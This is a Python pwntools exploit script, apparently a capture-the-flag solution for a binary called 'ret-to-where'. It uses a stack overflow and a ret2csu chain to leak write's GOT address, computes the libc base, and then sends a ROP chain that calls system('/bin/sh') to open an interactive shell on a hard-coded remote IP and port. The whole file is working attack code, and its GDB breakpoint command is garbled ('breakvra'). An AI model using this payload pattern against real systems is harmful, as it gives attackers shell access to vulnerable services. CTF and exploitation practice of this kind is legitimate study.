#!/usr/bin/python3
from pwn import *

# Set up the target binary by specifying the ELF file
elf = context.binary = ELF("ret-to-where")
# Defining the GDB script that will be used when running the binary with the GDB parameter
gs = '''
breakvra 0x000000000040055a
continue
'''
# Launch the binary with GDB, without GDB or REMOTE based on the command-line arguments
def start():
    if args.REMOTE:
        return remote("45.33.88.161", 1027)
        #return remote("127.0.0.1", 1027)
    else:
        if args.GDB:
            return gdb.debug(elf.path, gdbscript=gs)
        else:
            return process(elf.path)

context.terminal = ['gnome-terminal', '-e']
io = start()


print("[+] GOT Write: ", hex(elf.got.write))

payload = [
    b"A"*88,
    p64(elf.sym.__libc_csu_init + 90),
    p64(0),
    p64(1),
    p64(elf.got.write),
    p64(1),
    p64(elf.got.write),
    p64(8),
    p64(elf.sym.__libc_csu_init + 64),
    p64(0)*7,
    p64(elf.sym.main)
    ]

payload = b''.join(payload)

io.sendlineafter(b":", payload)

io.recv()

# Tomamos esos 8 bytes que es la posicion likeada
leak_got_write_address = u64(io.recv(8))

print("[+] Direccion likeada de write: ", hex(leak_got_write_address))

libc_address = leak_got_write_address - 0x114870

print("[+] Direccion likeada de write: ", hex(libc_address))

bin_sh = 0x1d8678
system = 0x050d70

pop_rdi = 0x00000000004005e3
ret = 0x0000000000400416

payload = b"".join(
    [
        b"A"*88,
        p64(pop_rdi),
        p64(libc_address + bin_sh),
        p64(ret),
        p64(libc_address + system)
    ]
)
io.sendline(payload)

io.interactive()




